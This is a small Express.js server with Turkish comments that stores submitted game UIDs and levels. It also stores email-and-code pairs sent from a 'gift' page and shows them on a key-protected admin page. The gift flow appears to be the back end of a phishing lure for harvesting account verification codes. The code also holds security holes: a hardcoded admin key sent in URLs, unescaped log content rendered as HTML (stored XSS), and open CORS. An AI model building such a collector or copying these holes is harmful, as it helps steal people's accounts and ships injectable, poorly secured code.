const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Basit bir "admin anahtarı"
const ADMIN_KEY = 'benim-gizli-anahtarim';

// Frontend dosyaları (public klasörü)
app.use(express.static(path.join(__dirname, 'public')));

// JSON body okumak için
app.use(express.json({ limit: '1mb' }));
app.use(cors());

// Kayıt dosyası
const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.txt');

// Kayıt satırı biçimi
function formatEntry({ uid, level, ip }) {
  const time = new Date().toISOString();
  return `${time} | ${ip} | ${uid} | ${level}\n`;
}

// Basit doğrulama
function isValidInput(uid, level) {
  if (!uid || !level) return false;
  if (uid.length > 200 || level.length > 200) return false;
  return true;
}

// Veri alma endpoint'i
app.post('/submit', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const { uid, level } = req.body || {};

  if (!isValidInput(uid, level)) {
    return res.status(400).json({ ok: false, message: 'UID ve Level zorunlu ve 200 karakteri geçmemeli.' });
  }

  const safeUid = String(uid).replace(/\r|\n/g, ' ');
  const safeLevel = String(level).replace(/\r|\n/g, ' ');

  const entry = formatEntry({ uid: safeUid, level: safeLevel, ip });

  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
    if (err) {
      console.error('Dosyaya yazarken hata:', err);
      return res.status(500).json({ ok: false, message: 'Sunucu hatası.' });
    }
    return res.json({ ok: true, message: 'Kayıt alındı.' });
  });
});

// Admin görünümü
app.get('/admin', (req, res) => {
  const key = req.query.key;
  if (key !== ADMIN_KEY) {
    return res.status(403).send('<h3>Yetkisiz. key parametresi hatalı.</h3>');
  }

  fs.readFile(SUBMISSIONS_FILE, 'utf8', (err, data) => {
    const content = err ? 'Henüz kayıt yok ya da dosya okunamadı.' : data;
    const html = `
      <!doctype html>
      <html lang="tr">
        <head>
          <meta charset="utf-8" />
          <title>Admin Kayıtlar</title>
          <style>
            body { font-family: sans-serif; max-width: 900px; margin: 40px auto; line-height: 1.6; }
            pre { background: #f4f4f4; padding: 16px; border-radius: 8px; overflow: auto; white-space: pre-wrap; }
            .top { display: flex; justify-content: space-between; align-items: center; }
            .btns a { margin-right: 12px; }
          </style>
        </head>
        <body>
          <div class="top">
            <h2>Kayıtlar (en altta en eski)</h2>
            <div class="btns">
              <a href="/download?key=${ADMIN_KEY}">Metin dosyasını indir</a>
              <a href="/admin?key=${ADMIN_KEY}">Yenile</a>
            </div>
          </div>
          <pre>${content}</pre>
        </body>
      </html>
    `;
    res.send(html);
  });
});

// Dosyayı indirme
app.get('/download', (req, res) => {
  const key = req.query.key;
  if (key !== ADMIN_KEY) {
    return res.status(403).send('Yetkisiz');
  }
  if (!fs.existsSync(SUBMISSIONS_FILE)) {
    return res.status(404).send('Henüz kayıt dosyası yok.');
  }
  res.download(SUBMISSIONS_FILE, 'submissions.txt');
});
// KOD gönderimi için endpoint (gift.html'den gelecek)
app.post('/submit-code', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const { email, code } = req.body || {};

  // Basit kontrol
  if (!email || !code) {
    return res.status(400).json({ ok: false, message: 'E-posta ve Kod zorunlu.' });
  }
  if (email.length > 200 || code.length > 200) {
    return res.status(400).json({ ok: false, message: 'E-posta/Kod 200 karakteri geçmemeli.' });
  }

  // Dosyaya düzgün yazmak için satır sonlarını temizle
  const safeEmail = String(email).replace(/\r|\n/g, ' ');
  const safeCode = String(code).replace(/\r|\n/g, ' ');

  const time = new Date().toISOString();
  const entry = `${time} | ${ip} | CODE_SUBMIT | email=${safeEmail} | code=${safeCode}\n`;

  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
    if (err) {
      console.error('Kod yazarken hata:', err);
      return res.status(500).json({ ok: false, message: 'Sunucu hatası.' });
    }
    return res.json({ ok: true, message: 'Kod kaydedildi.' });
  });
});

// Sunucu başlat
app.listen(PORT, () => {
  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
});
